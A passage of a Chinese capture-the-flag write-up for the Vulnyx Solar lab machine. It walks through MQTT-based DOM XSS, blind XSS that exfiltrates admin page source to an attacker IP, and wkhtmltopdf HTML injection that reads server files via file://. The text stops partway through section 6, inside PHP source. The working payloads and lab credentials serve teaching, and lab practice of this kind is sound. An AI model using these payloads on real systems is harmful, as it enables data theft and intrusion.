# Vulnyx Solar 靶机 Writeup

> **目标**：从外部 Web 服务打点到 `root`，记录完整攻击链、关键原理与可复现命令。
>
> **主线**：证书 SAN 枚举域名 → 后台源码泄露 MQTT 凭据 → MQTT `data` 主题 DOM XSS → 盲打管理员拿到 `record` / `/records` → wkhtmltopdf 读取后端源码 → MQTT 命令队列 getshell → `doas` 横向 → Node.js 调试接口 → `backups` + `PATH` 劫持提权。

![Solar 攻击链总览](images/d99b01320bff53e94d61acf2d9d7fa1eaee194d1.png)

## 攻击链速览

| 阶段            | 入口                         | 关键动作                                 | 结果 / 下一跳                                              |
| --------------- | ---------------------------- | ---------------------------------------- | ---------------------------------------------------------- |
| 1. 信息收集     | 443 HTTPS                    | 查看证书 SAN、目录爆破                   | 两个域名、登录页、`database.sql.gz`                        |
| 2. 初始访问     | `www.solar.nyx` 登录         | 破解压缩包、登录后台、审计源码           | 拿到 MQTT 凭据，发现 `data` 主题与 `innerHTML`             |
| 3. XSS 验证     | MQTT `data` 主题             | 向 Broker 发布恶意 JSON                  | `alert(1)` 弹窗，确认 DOM XSS                              |
| 4. 管理员源码   | 管理员也订阅 `data`          | 盲打 XSS，外带 dashboard 源码            | 拿到 admin MQTT 凭据、`record` 主题、`/records`            |
| 5. records 侦察 | `/records` 下载按钮          | XSS 读页面、尝试路径穿越                 | 页面源码、`/etc/passwd` 404、PDF 元数据                    |
| 6. PDF 生成器   | `record` 主题的 `chart` 字段 | 注入 HTML，触发 wkhtmltopdf              | 读取 `index.php`、`session.php`、`login.php`、`server.php` |
| 7. 第二入口     | `server.php` + MQTT          | 向 `server/command/new` 上传命令文件     | 命令出现在后台，执行后下载 webshell                        |
| 8. Foothold     | `www-data` webshell          | `doas` + `mosquitto_pub` 外带文件        | `user.txt`、`note.txt`、SSH 私钥、GPG 密钥                 |
| 9. 横向         | `lenam`                      | 破解 GPG；`doas kill` 触发 Node 调试     | 拿到 `julian` shell                                        |
| 10. 提权        | `julian`                     | `backups` + `libbackup.so` + `PATH` 劫持 | `root` shell                                               |

## 目录

1. [信息收集：证书 SAN 与目录爆破](#1-信息收集证书-san-与目录爆破)
2. [初始访问：数据库备份、后台登录与源码泄露](#2-初始访问数据库备份后台登录与源码泄露)
3. [MQTT 基础与 DOM XSS](#3-mqtt-基础与-dom-xss)
4. [盲打管理员：源码与 record 主题](#4-盲打管理员源码与-record-主题)
5. [records 页面：源码、文件读取与 PDF 线索](#5-records-页面源码文件读取与-pdf-线索)
6. [wkhtmltopdf：从 SSRF 到源码读取](#6-wkhtmltopdf从-ssrf-到源码读取)
7. [第二入口：server.php 与 MQTT 命令队列](#7-第二入口serverphp-与-mqtt-命令队列)
8. [横向移动：doas 与 MQTT 外带](#8-横向移动doas-与-mqtt-外带)
9. [提权到 julian：Node.js 调试接口](#9-提权到-juliannodejs-调试接口)
10. [提权到 root：backups 与 PATH 劫持](#10-提权到-rootbackups-与-path-劫持)
11. [复盘与速查](#11-复盘与速查)

## 1. 信息收集：证书 SAN 与目录爆破

### 1.1 443 上的 Web 服务

目标开放了 443 的 Web 服务。可以直接在浏览器里查看证书，也可以用 nmap 查看。

![](images/2026-10-19-12-22-22-image.png)

![](images/2026-10-19-12-22-57-image.png)

### 1.2 证书 SAN 泄露域名

一张证书可以覆盖多个域名，这些域名会写在 **SAN（Subject Alternative Name，主题备用名称）** 字段里。拿到 HTTPS 站点后，先看 SAN，常常能直接扩出虚拟主机域名。

> **复习点**：证书 SAN 是低成本发现隐藏域名的入口。

证书里能看到后续会用到的两个域名：`www.solar.nyx` 和 `www.sunfriends.nyx`。

### 1.3 目录爆破

对两个域名分别进行目录爆破，发现登录页和一个压缩包（后续确认是 `database.sql.gz`）。

![](images/2026-10-19-12-45-52-image.png)

![](images/2026-10-19-12-53-24-image.png)

> **阶段复盘 · 信息收集**
>
> - **目标**：确认 Web 资产、隐藏域名和可下载文件。
> - **关键发现**：SAN 暴露两个域名；目录爆破得到登录页和 `database.sql.gz`。
> - **下一跳**：破解压缩包，尝试登录两个域名的后台。

## 2. 初始访问：数据库备份、后台登录与源码泄露

### 2.1 下载并破解压缩包

下载后查看压缩包内容：

![](images/2026-10-19-13-11-25-image.png)

对压缩包进行破解：

![](images/2026-10-19-13-12-17-image.png)

破解后得到登录凭证，后续用它尝试两个域名的登录页。

### 2.2 两个域名的登录结果

`www.sunfriends.nyx` 的登录框登不进去。

`www.solar.nyx` 登录成功，但登录后的页面看起来“什么都没有”，于是查看源码。

![](images/2026-10-19-13-14-57-image.png)

登录前的源码如下：

![](images/2026-10-19-13-16-10-image.png)

登录后源码里多出一段 MQTT 与 Chart.js 逻辑：

```html
<!--<script src="/mqtt.min.js"></script>-->

    <script src="/chart.js"></script>
    <script type="module">
        import mqtt from '/mqtt.js'

        let userName = "calvin";
        let userRole = "user";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'user',
            password: '1tEa15klQpTx9Oub6ENG',
            protocolId: 'MQTT'
        });

        mqttclient.on("message", getMessagesStatus);

        function getMessagesStatus(msTopic, msBody) {
            let data = JSON.parse(msBody.toString());
            setParams(data.solarEnergy, data.consumedEnergy);
        }

        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });

        let solar = 0, consumed = 0, grid = 0;

        // Initialize the bar chart using Chart.js
        const ctx = document.getElementById('energyChart').getContext('2d');
        let energyChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: ['Solar', 'Consumed', 'Grid'],
                datasets: [{
                    label: 'Energy (kWh)',
                    data: [solar, consumed, grid],
                    backgroundColor: ['#6fcf97', '#eb5757', '#56ccf2'],
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            callback: function (value) { return value + " kWh"; }
                        }
                    }
                },
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function (context) {
                                return context.dataset.label + ': ' + context.raw + ' kWh';
                            }
                        }
                    }
                }
            }
        });

        // Update the chart and labels with new data
        function setParams(solarEnergy, consumedEnergy) {
            let gridEnergy = consumedEnergy - solarEnergy;
            solar = solarEnergy;
            consumed = consumedEnergy;
            grid = gridEnergy;


            // Update the bar chart
            energyChart.data.datasets[0].data = [solar, consumed, grid];
            energyChart.update();

            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;

            let gridLabel = document.getElementById('gridEnergyLabel');
            gridLabel.innerHTML = `<span class="energy-value ${gridEnergy < 0 ? 'grid-negative' : 'grid-positive'}">${gridEnergy} kWh</span>`;

            document.getElementById('userInfo').innerHTML = `<span>${userName}</span><br>${userRole}`;
        }

        setParams(0, 0);
```

关键不在图表配置，而在三个位置：

- `mqtt.connect('wss://www.solar.nyx/wss/', ...)`：浏览器通过 WebSocket 连接 MQTT Broker。
- `mqttclient.subscribe("data", ...)`：前端订阅 `data` 主题。
- `setParams()` 中把 `solarEnergy`、`consumedEnergy` 直接赋给 `innerHTML`：数据进入 HTML 解析器。

登录后的页面：

![](images/2026-10-19-13-38-29-image.png)

### 2.3 源码里的关键信息

- **用户**：`calvin` / `user`
- **MQTT 连接**：`wss://www.solar.nyx/wss/`
- **MQTT 账号**：`user` / `1tEa15klQpTx9Oub6ENG`
- **订阅主题**：`data`
- **数据流入点**：`JSON.parse(msBody.toString())` 后调用 `setParams(...)`
- **危险 Sink**：`setParams()` 中使用 `innerHTML` 拼接 `solarEnergy`、`consumedEnergy`

这些信息构成后续 MQTT 利用的起点。

> **阶段复盘 · 初始访问**
>
> - **目标**：用泄露的数据库文件进入后台，并从源码找下一个入口。
> - **关键发现**：`www.solar.nyx` 后台源码泄露 MQTT over WebSocket 凭据；前端订阅 `data` 并把数据写入 `innerHTML`。
> - **下一跳**：用这组凭据连接 Broker，验证 `data` 主题能否触发 DOM XSS。

## 3. MQTT 基础与 DOM XSS

### 3.1 发布/订阅模式

MQTT 的核心是 **发布/订阅（Pub/Sub）**：

- **HTTP** 是“你问我答”，前端主动请求数据。
- **MQTT** 是 Broker 把消息推送给所有订阅者，适合设备持续上报数据的场景。

网站订阅了 `data` 主题：

![](images/2026-10-19-13-50-23-image.png)

### 3.2 确认 WebSocket 上的 MQTT

请求会进行 WebSocket 升级。从请求头可以判断这是隧道用的 WebSocket，里面跑的是 MQTT 协议：

![](images/2026-10-19-13-37-18-image.png)

源码中的 `mqtt.connect('wss://www.solar.nyx/wss/', ...)` 也印证了这一点。

### 3.3 危险点：innerHTML

源码使用 `innerHTML`，它会把字符串当作 HTML 解析，而不是纯文本。只要数据里带标签或事件处理器，就可能形成 XSS。

![](images/2026-10-19-13-39-09-image.png)

![](images/2026-10-19-17-45-11-image.png)

### 3.4 连接 Broker 并观察数据流

先用 `mqttui` 连接 Broker：

```bash
mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG"
```

连接后可以看到，后端上游一直在向 Broker 发布 JSON；前端订阅 `data`，Broker 再把消息转发给网页。

```text
硬件设备 -> Broker -> 前端网页
```

前端**完全信任** `data` 主题的数据，因为它默认这些数据来自安全的硬件设备。

> **操作技巧**：在 mqttui 等控制面板中，按住 `Shift` + 鼠标左键选择内容，再按 `Ctrl + Shift + C` 即可复制。

![](images/2026-10-19-18-18-25-image.png)

之前看到的 JS 源码：

![](images/2026-10-19-18-25-52-image.png)

Broker 发来的两个字段被直接放进 `innerHTML`：

![](images/2026-10-19-18-29-59-image.png)

### 3.5 向 data 主题写入 Payload

```bash
mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG" --insecure publish "data" '{"solarEnergy": "<img src=x onerror=alert(1)>"}'
```

![](images/2026-10-19-18-44-16-image.png)

弹窗出现，DOM XSS 确认。

### 3.6 权限隔离与盲打思路

普通用户和管理员看到的页面不同，是因为服务器返回的 HTML 本身就不同；这里大概率用 Cookie 标识身份。

当前无法直接登录管理员后台，只能盲打 XSS，外带 Cookie 或管理员页面源码。既然普通用户后台源码会泄露 MQTT 凭据，管理员源码也可能泄露更有价值的信息。

**如果管理员也订阅了 `data` 主题，Payload 就会在管理员浏览器里执行。**

> **阶段复盘 · DOM XSS**
>
> - **目标**：确认 `data` 主题的数据能否进入 HTML 解析。
> - **关键发现**：`solarEnergy` / `consumedEnergy` 被直接拼进 `innerHTML`。
> - **结果**：用泄露的 MQTT 凭据发布 `<img src=x onerror=alert(1)>`，弹窗确认 DOM XSS。
> - **下一跳**：盲打管理员，外带后台源码。

## 4. 盲打管理员：源码与 record 主题

### 4.1 外带思路与编码

盲打需要把数据带回攻击机。本地用 `python3` 开一个 HTTP 服务，把源码或 Cookie 放在查询参数里：

```html
<img src=x onerror="location.href='http://192.168.56.1:8000?datas='+btoa(document.body.outerHTML)">
```

- `document.body.outerHTML` 取当前页面 HTML。
- `btoa()` 做 Base64，避免特殊字符破坏 URL。
- `location.href` 发起 GET 请求，把数据带到攻击机。

> **编码坑**：`btoa()` 不能直接编码含中文的字符串。需要时先套一层 `encodeURIComponent`，例如 `btoa(encodeURIComponent(document.body.outerHTML))`。

### 4.2 encodeURI 与 encodeURIComponent

| 函数                 | 用途           | 编码特点                                  | 典型场景                            |
| -------------------- | -------------- | ----------------------------------------- | ----------------------------------- |
| `encodeURI`          | 编码完整 URL   | 保留 `://`、`?`、`&`、`=` 等 URL 结构字符 | 把一个完整网址作为参数传递          |
| `encodeURIComponent` | 编码单个参数值 | 连 `&`、`=`、`/`、`?` 都会编码            | 把 HTML、Cookie 等文本塞进 `?data=` |

把一大段 HTML 放进查询参数时，必须用 `encodeURIComponent`。否则 HTML 里的 `&` 会被服务器当成参数分隔符，后面的数据会被截断。

### 4.3 location.href 强制跳转

- `location.href` 设置 URL 后直接跳转。
- 默认发起 GET 请求。
- 也可以发 POST，把内容放进请求体；但本例后面测试 POST 时被浏览器丢弃，见 5.4。

### 4.4 拿到管理员页面源码

Payload 执行后，拿到管理员后台源码：

```html
<script type="module">
        import mqtt from '/mqtt.js'

        let userName = "JulianAdm";
        let userRole = "admin";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'admin',
            password: 'tJH8HvwVwC57BR6CEyg5',
            protocolId: 'MQTT'
        });
```

源码直接泄露了管理员 MQTT 凭据：`admin` / `tJH8HvwVwC57BR6CEyg5`。

管理员页面还有发送记录的逻辑：

```javascript
// Function to send the record
            function sendrecord() {
                let btn = document.getElementById('send-record-id');
                if (!btn.disabled) {
                    // Capture the chart as a base64 image
                    let chartImage = energyChart.toBase64Image();

                    mqttclient.publish('record', JSON.stringify({
                        time: new Date().toISOString(),
                        user: {
                            name: userName,
                            role: userRole
                        },
                        solar: solar,
                        consumed: consumed,
                        grid: grid,
                        chart: chartImage
                    }));

                    btn.disabled = true;
                    btn.style.opacity = '0.3';


                    setTimeout(() => {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        showMessage('Record was end successfully!')
                    }, 1500);
                }
            }
            document.getElementById('send-record-id').onclick = sendrecord;
```

`sendrecord()` 把图表转成 Base64，连同时间、用户、发电量等字段发布到 `record` 主题。这个 `chart` 字段后续会进入 PDF 模板。

### 4.5 发现 record 主题

从 `sendrecord()` 源码中发现新的 Topic：`record`。

![](images/2026-10-20-13-32-34-image.png)

![](images/2026-10-20-13-56-04-image.png)

### 4.6 Records 与 Send record

管理员页面里有两个用链接做的按钮：

- **`Records`**：进入 `/records` 路由。
- **`Send record`**：触发 `sendrecord()`，向 Broker 的 `record` 主题发送包含 Base64 图表图片与记录字段的 JSON。

当时还不知道 `/records` 里有什么，于是计划用 XSS 发同源请求，让管理员进入 `/records`，再读取源码带回。

> **阶段复盘 · 管理员源码**
>
> - **目标**：利用管理员也订阅 `data` 的条件，外带管理员页面。
> - **关键发现**：管理员源码包含 MQTT 凭据、`record` 主题和 `/records` 路由。
> - **结果**：拿到 `admin / tJH8HvwVwC57BR6CEyg5`。
> - **下一跳**：读取 `/records` 页面源码，寻找新的攻击面。

## 5. records 页面：源码、文件读取与 PDF 线索

### 5.1 用 fetch 读取同源页面

`fetch()` 请求成功后返回一个 Response 对象。用变量接住响应对象，调用 `.text()` 就能把响应体转成文本，再编码外带。

```html
<img src=x onerror="fetch('/records/').then(r=>r.text()).then(t=>{(new Image()).src='http://192.168.56.1:8000/?data='+btoa(encodeURIComponent(t));})" />
```

![](images/2026-10-20-15-05-20-image.png)

用 `new Image()` 时，HTTPS 页面请求 HTTP 资源会触发混合内容限制或 HTTPS 升级；截图里抓到的是握手包。

但后面用同样的 Image payload 做 XSS 时，既没有升级 HTTPS，也没有收到响应。确认 Payload 已经到达目标浏览器后，把 `Image` 改成 `location.href` 才成功：

![](images/2026-10-20-16-06-53-image.png)

解码时先做 Base64 解码，再做 URL 解码：

![](images/2026-10-20-16-15-20-image.png)

| 方式              | 页面是否跳转         | 混合内容限制   | 实测结果 |
| ----------------- | -------------------- | -------------- | -------- |
| `new Image().src` | 不会，后台静默发请求 | 可能被拦       | 不稳定   |
| `location.href`   | 会，页面跳转到攻击机 | 不受同样的限制 | 可用     |

如果在意隐蔽性，可以先用 `new Image().src` 试收数据；收不到再换 `location.href`。

### 5.2 records 页面源码

```html
<!DOCTYPE html>
<html>

<head>
    <title>List of Solar Energy Data</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style3.css">
</head>

<body>
    <div style="min-width:400px;background:white;padding:15px;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
        <div style="text-align:center;"><object class="solar-icon" data="../sun.svg" type="image/svg+xml" style="width:75px;"></object></div>
        <h1>List of Solar Energy Data</h1>
        <table>
            <tr>
                <th>Record</th>
                <th>Actions</th>
            </tr>
                            <tr>
                    <td>2024-09-02T23:15:11.396Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A15%3A11.396Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:18:15.742Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A18%3A15.742Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:18:44.091Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A18%3A44.091Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:24:33.828Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A24%3A33.828Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:24:44.800Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A24%3A44.800Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:25:15.961Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A25%3A15.961Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:29:14.124Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A29%3A14.124Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                    </table>
        <a href="../dashboard.php" class="logout-link">< Back</a>
    </div>
</body>

</html>
```

只需要关注下载链接：

```html
<a href="?download=true&file=2024-09-02T23%3A25%3A15.961Z.json" class="download-btn">Download PDF</a>
```

### 5.3 下载逻辑与路径穿越尝试

后端从前端传来的 `file` 字段取文件名，去目录里找文件，再把对应文件返回。每条下载链接都指向类似 `?download=true&file=...json` 的请求。

如果后端直接把 `file` 拼进路径，就可能存在任意文件读取（Path Traversal）：

```php
$filename = "/var/www/html/records/" . $_GET['file'];
```

但 `/records` 是管理员页面，直接访问会被重定向到认证页：

![](images/2026-10-20-18-54-04-image.png)

回车后跳转到认证页面：

![](images/2026-10-20-18-53-55-image.png)

所以还是需要用 XSS 触发同源请求：

```html
<img src=x onerror="fetch('/records/?download=true&file=../../../../../etc/passwd').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />
```

回显如下：

![](images/2026-10-20-18-23-04-image.png)

![](images/2026-10-20-18-24-18-image.png)

文件未找到。当时误以为路径穿越成功但文件不存在；后来读 `index.php` 源码才确认，`basename()` 会拦掉路径穿越，并且只允许 `.json` 文件。具体分析见 **6.7**。

![](images/2026-10-20-18-32-40-image.png)

### 5.4 下载 JSON 与 414

先下载一个 `.json` 文件，看看内容。因为黑盒读不出源码，只能先拿业务数据：

```python
# GET 回传
payload_html = '''<img src=x onerror="fetch('/records?download=true&file=2024-09-02T23%3A29%3A14.124Z.json').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />'''
```

`btoa(encodeURIComponent(t))` 会把字符扩长，URL 长度超出限制，返回 414：

![](images/2026-10-20-18-55-17-image.png)

改为 POST，把内容放进请求体带回。测试多次，用 `fetch` 向攻击机发 POST 都没有收到数据；目标浏览器把 HTTPS 页面连接 HTTP 页面的行为视为不安全，直接丢弃了请求。

最终仍用 `location.href` 发 GET，但改用更紧凑的二进制编码：

```html
<img src=x onerror=\"(async () => {const b = await (await fetch('/records/?download=true&file=文件名字')).arrayBuffer(); const t = String.fromCharCode(...new Uint8Array(b)); location.href='http://192.168.56.1:8000/?data='+btoa(t);})();\" />
```

`btoa(String.fromCharCode(...new Uint8Array(b)))` 比先做 URL 编码更紧凑，可以放进 GET 参数而不触发 414。

### 5.5 PDF 内容与元数据

拿到的 PDF 转成文本后没有内容：

![](images/2026-10-21-17-08-46-image.png)

![](images/2026-10-21-13-45-18-image.png)

再看 PDF 元数据：

![](images/2026-10-21-17-20-30-image.png)

元数据显示生成器是 `wkhtmltopdf 0.12.6.1`。这个生成器允许加载外部资源来渲染 PDF：

![](images/2026-10-21-17-46-43-image.png)

![](images/2026-10-21-17-49-49-image.png)

PDF 的内容来自前端提交的数据。版本 `0.12.6.1` 对应 **CVE-2022-35583**，是一个 SSRF。

### 5.6 业务架构

现实中，这套系统通常由三个物理隔离的部分组成：

1. **边缘设备（Edge Device）**
   - 连接太阳能板和电表的树莓派或 PLC。
   - 每隔 2 秒计算一次发电量，作为 MQTT 客户端（Publisher），把 `{"solarEnergy": 104...}` 发到 Broker 的 `data` 主题。
2. **MQTT Broker（消息中枢）**
   - 部署在云端或机房，接收设备数据并广播给订阅者。
3. **Web 服务器（前端 + 后端）**
   - **前端**：浏览器连接 Broker 订阅 `data`，实时更新图表。
   - **后端**：订阅 `record` 主题，把管理员提交的数据保存为 JSON；管理员在 `/records` 点击下载时，再调用 `wkhtmltopdf` 生成 PDF。

![](images/2026-10-21-18-10-03-image.png)

在这台靶机里，三个部分都塞在同一台机器上，理解业务逻辑时容易混淆。结合后面的源码与实测，`record` 消息并不会立即生成 PDF，而是先落盘，下载时才渲染。

> **阶段复盘 · records 与 PDF 入口**
>
> - **目标**：读取 `/records` 源码，寻找新的文件读取/渲染入口。
> - **关键发现**：下载接口使用 `file` 参数；PDF 由 `wkhtmltopdf 0.12.6.1` 生成，存在 CVE-2022-35583 的利用面。
> - **结果**：`record` 主题的 `chart` 字段是进入 PDF 渲染的高概率入口。
> - **下一跳**：向 `record` 注入 HTML，验证渲染并读取后端源码。

## 6. wkhtmltopdf：从 SSRF 到源码读取

### 6.1 漏洞面：HTML 渲染导致 SSRF

第 5 节确认 PDF 由 `wkhtmltopdf 0.12.6.1` 生成，且 `chart` 字段来自 MQTT 的 `record` 消息。后端把 `chart` 拼进 HTML，再交给 wkhtmltopdf 渲染。

**漏洞本质**：输入被当作 HTML 处理，渲染引擎会加载其中的外部资源或本地文件，形成 SSRF / 任意文件读取。

> **判断口诀**：只要输入点最终会被当作 HTML 渲染，就可以尝试注入外部资源或 `file://` 本地文件协议。

后端大致逻辑：

```php
// 1. 接收前端传来的 chart 数据
$chart = $_POST['chart'];

// 2. 拼接 HTML 模板
$html = "<h1>Solar Energy Data</h1>";
$html .= "<img src='" . $chart . "'>";

// 3. 交给渲染引擎
exec("wkhtmltopdf data.html output.pdf");
```

### 6.2 找到后端处理逻辑

在读取处理管理员请求的 `index.php` 之前，先用管理员账号连上 MQTT，观察 `record` 主题的订阅情况：管理员客户端并没有订阅它。

![](images/2026-10-22-12-24-02-image.png)

但之前的管理员源码已经证明 `record` 主题存在，因此有两条路：

1. 直接用 MQTT 客户端，以管理员身份向 `record` 发布恶意 `chart`。
2. 用 XSS 修改页面里的 `chart` 内容，再模拟点击按钮，借用 Web 前端的 MQTT 连接发送。

这里选第一种。

### 6.3 向 record 主题发送恶意 chart

用图形界面直接发布，或者写 Python 脚本。先测试 wkhtmltopdf 能否访问攻击机：

```json
{
  "time": "2026-01-02T23:29:14.012Z",
  "user": { "name": "JulianAdm", "role": "admin" },
  "solar": 232,
  "consumed": 223,
  "grid": -9,
  "chart": "<iframe src='http://192.168.56.1:8000'></iframe>"
}
```

发送后，`record` 主题出现了：

![](images/2026-10-22-13-45-20-image.png)

但攻击机没有收到请求。结合 `/records` 页面和下载按钮，推测 PDF 不是收到 `record` 就生成，而是点击“下载 PDF”时才处理。

为了验证，先用 XSS 读取 `/records/`，看刚才的记录有没有出现：

```html
<img src=x onerror="fetch('/records/').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />
```

![](images/2026-10-22-13-04-56-image.png)

记录出现了。

### 6.4 下载触发渲染

点击下载，观察是否会触发：

![](images/2026-10-22-13-51-45-image.png)

图片被生成器渲染并下载回来了，但没有向攻击机请求 `shell.php`。官方漏洞示例用的是 `<iframe>`，这里可能受环境影响。

换 `<script>` 和其他标签测试：

```jsonc
"chart": "\"><img src='http://192.168.56.1:8000/test'><x=\""
```

```jsonc
"chart": "\"><script>fetch('http://192.168.56.1:8000/test')</script><x=\""
```

测试结果是：只有 `<img src>` 能触发请求，`fetch` 不行。用 `XMLHttpRequest` 代替 `fetch`：

![](images/2026-10-22-19-23-56-image.png)

`\` 用于 JSON 字符串转义。Payload 必须闭合 HTML 属性，才能跳出原来的 `<img src="...">`。

### 6.5 闭合 chart 字段

后端直接拼接 `chart`，要闭合 `src` 属性并插入自己的标签：

```php
$html .= '<img src="' . $chart . '" />';
```

完整一点的拼接逻辑：

```php
// 1. 接收前端传来的数据
$data = json_decode($mqtt_message, true);
$chart = $data['chart'];

// 2. 拼接到 HTML 中
$html = "<html><body>";
$html .= "<h1>Solar Energy Data</h1>";
$html .= '<img src="' . $chart . '" />';
$html .= "</body></html>";

// 3. 交给 wkhtmltopdf 渲染
file_put_contents("report.html", $html);
exec("wkhtmltopdf report.html report.pdf");
```

Payload 需要让 `src` 属性提前闭合，再插入标签：

```jsonc
"chart": "\"><img src='http://192.168.56.1:8000/test'><x=\""
```

- `\">` 先闭合 `src="` 并结束标签。
- `<img src=...>` 插入新标签。
- `<x="` 补一个属性，让后面的模板拼接仍然合法。

### 6.6 读取 index.php

读取 `/var/www/solar.nyx/records/index.php` 的 Payload：

```text
"chart": "\"><script>\np='/var/www/solar.nyx/records/index.php';\nx=new XMLHttpRequest;\nx.onerror=function(){{document.write('<p>'+p+' not found')}};\nx.onload=function(){{document.write('<p>'+p+'</p><div style=\"word-break: break-all;max-width:90%;\">'+btoa(this.responseText)+'</div>')}};\nx.open(\"GET\",\"file://\"+p);x.send();\n</script><x=\""
```

这个 Payload 把读到的源码写进 PDF 页面。也可以直接外带到攻击机：

```text
"chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/records/index.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
```

这里不能用 `new Image()`，要用 `<img src=...>` 才会触发请求。可能是因为目标浏览器/渲染引擎较老，不支持前者。

> **另一种思路**：上面的第一个 Payload 就是把源码写进 PDF 页面；如果目标没有外网出口，下载 PDF 即可把数据带回。这就是带外（Out-of-Band）通道。

`/var/www/solar.nyx/records/index.php` 源码较长，重点看顶部的会话校验、`generatePDF()` 和下载分支：

```php
<?php
include("../session.php");

if (!isset($_SESSION['username']) || empty($_SESSION['username']) || $_SESSION['role'] != 'admin') {
    header("Location: /index.php");
    exit();
}



$directory = __DIR__ . '/'; // Directorio donde se encuentran los archivos JSON


$files = glob($directory . '*.json');
usort($files, function ($a, $b) {
    return filemtime($b) - filemtime($a);
});

$filesToKeep = array_slice($files, 0, 10);
$filesToDelete = array_slice($files, 10);

foreach ($filesToDelete as $file) {
    if (is_file($file)) {
        unlink($file);
    }
}

$jsonFiles = glob($directory . '*.json'); 


function generatePDF($data, $filename)
{
    $html = '<html><head><title>Solar Energy Data</title><style>
    .energy-meter {
        margin: 20px auto;
        text-align: center;
    }
    h1 { text-align: center; }
    </style></head><body>';
    $html .= '<div style="text-align:center;"><br><br><img src="/var/www/solar.nyx/sun.svg" width="250" height="150"></div><br><br>';
    $html .= '<h1>Solar Energy Data<br><small>' . htmlspecialchars($data['time']) . '</small></h1><br><br><br><div class="energy-meter"><img src="' . ($data['chart']) . '" /></div><br>';
    $html .= '<table border="0" cellpadding="4" style="margin-left:auto;margin-right:auto;">
                <tr>
                    <th align="right">Registered by user</th>
                    <td>' . htmlspecialchars($data['user']['name']) . ' (' . htmlspecialchars($data['user']['role']) . ')</td>
                </tr>
                <tr> 
                    <th align="right">Solar</th>
                    <td>' . htmlspecialchars($data['solar']) . '</td>
                </tr>
                <tr>
                    <th align="right">Consumed</th>
                    <td>' . htmlspecialchars($data['consumed']) . '</td>
                </tr>
                <tr>
                    <th align="right">Grid</th>
                    <td>' . htmlspecialchars($data['grid']) . '</td>
                </tr>
              </table>';
    $html .= '</body></html>';


    $tempHtmlFile = tempnam(sys_get_temp_dir(), 'html_') . '.html';
    file_put_contents($tempHtmlFile, $html);

    $outputPdfFile = sys_get_temp_dir() . '/' . $filename;
    $command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");

    $result = shell_exec($command . ' 2>&1');
    if ($result === null) {
        unlink($tempHtmlFile);
        throw new Exception('Error generate PDF: ' . $result);
    }

    unlink($tempHtmlFile);

    return $outputPdfFile;
}

if (isset($_GET['download']) && isset($_GET['file'])) {
    $file = basename($_GET['file']);
    $filePath = $directory . '/' . $file;

    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'json') {
        $data = json_decode(file_get_contents($filePath), true);
        if ($data === null) {
            http_response_code(400);
            echo 'Error read JSON.';
            exit;
        }

        try {
            $pdfFile = generatePDF($data, basename($file, '.json') . '.pdf');
            header('Content-Type: application/pdf');
            header('Content-Disposition: attachment; filename="' . basename($pdfFile) . '"');
            readfile($pdfFile);
            unlink($pdfFile);
            exit;
        } catch (Exception $e) {
            http_response_code(500);
            echo 'Error generate PDF: ' . $e->getMessage();
            exit;
        }
    } else {
        http_response_code(404);
        echo 'File not found.';
        exit;
    }
}

?>
<!DOCTYPE html>
<html>

<head>
    <title>List of Solar Energy Data</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style3.css">
</head>

<body>
    <div style="min-width:400px;background:white;padding:15px;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
        <div style="text-align:center;"><object class="solar-icon" data="../sun.svg" type="image/svg+xml" style="width:75px;"></object></div>
        <h1>List of Solar Energy Data</h1>
        <table>
            <tr>
                <th>Record</th>
                <th>Actions</th>
            </tr>
